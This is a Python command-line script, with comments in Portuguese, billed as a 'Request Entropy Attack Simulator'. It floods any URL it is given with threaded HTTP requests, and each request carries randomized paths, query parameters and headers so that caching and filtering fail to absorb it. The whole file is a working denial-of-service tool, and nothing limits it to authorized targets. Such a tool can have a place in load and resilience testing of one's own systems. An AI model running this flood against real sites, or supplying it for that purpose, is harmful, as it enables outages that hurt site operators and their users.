#!/usr/bin/env python3
import sys
import argparse
import threading
import time
import random
import string
import urllib.request
import urllib.parse
import urllib.error

# Configuração de cores
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

stats = {
    "requests": 0,
    "success": 0,
    "errors": 0
}
running = True

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_high_entropy_url(base_url):
    # Adicionar muitos parâmetros aleatórios
    num_params = random.randint(5, 15)
    params = {}
    for _ in range(num_params):
        key = random_string(random.randint(5, 10))
        val = random_string(random.randint(10, 50))
        params[key] = val

    # Adicionar path aleatório extra
    extra_path = random_string(random.randint(5, 10))

    parts = list(urllib.parse.urlparse(base_url))
    # parts[2] is path
    if not parts[2].endswith('/'):
        parts[2] += '/'
    parts[2] += extra_path

    # parts[4] is query
    query = urllib.parse.urlencode(params)
    parts[4] = query

    return urllib.parse.urlunparse(parts)

def attack_task(url):
    global stats, running

    while running:
        try:
            target_url = generate_high_entropy_url(url)
            req = urllib.request.Request(target_url)

            # Adicionar Headers com alta entropia
            for _ in range(random.randint(3, 8)):
                h_key = f"X-{random_string(5)}"
                h_val = random_string(20)
                req.add_header(h_key, h_val)

            req.add_header("User-Agent", f"EntropyTest/{random_string(5)}")

            with urllib.request.urlopen(req, timeout=5) as response:
                stats["requests"] += 1
                if 200 <= response.status < 300:
                    stats["success"] += 1
                else:
                    stats["errors"] += 1

        except Exception:
            stats["errors"] += 1

def monitor_thread():
    global stats, running
    while running:
        print(f"\r{Colors.OKBLUE}[*] Entropy Flood ({stats['requests']} reqs) | Success: {stats['success']} | Errors: {stats['errors']}{Colors.ENDC}", end="")
        time.sleep(1)

def main():
    global running
    parser = argparse.ArgumentParser(description="Simulador de Ataque de Entropia (Randomização Extrema)")
    parser.add_argument("url", help="URL base alvo")
    parser.add_argument("--threads", type=int, default=10, help="Número de threads simultâneas")
    parser.add_argument("--duration", type=int, default=60, help="Duração (s)")

    args = parser.parse_args()

    print(f"{Colors.HEADER}=== Iniciando Request Entropy Attack Simulator ==={Colors.ENDC}")
    print(f"Alvo Base: {args.url}")
    print("Gerando URLs e Headers com alta aleatoriedade...")

    monitor = threading.Thread(target=monitor_thread)
    monitor.daemon = True
    monitor.start()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack_task, args=(args.url,))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Interrompido!{Colors.ENDC}")

    running = False
    print(f"\n{Colors.OKGREEN}Simulação finalizada.{Colors.ENDC}")

if __name__ == "__main__":
    main()
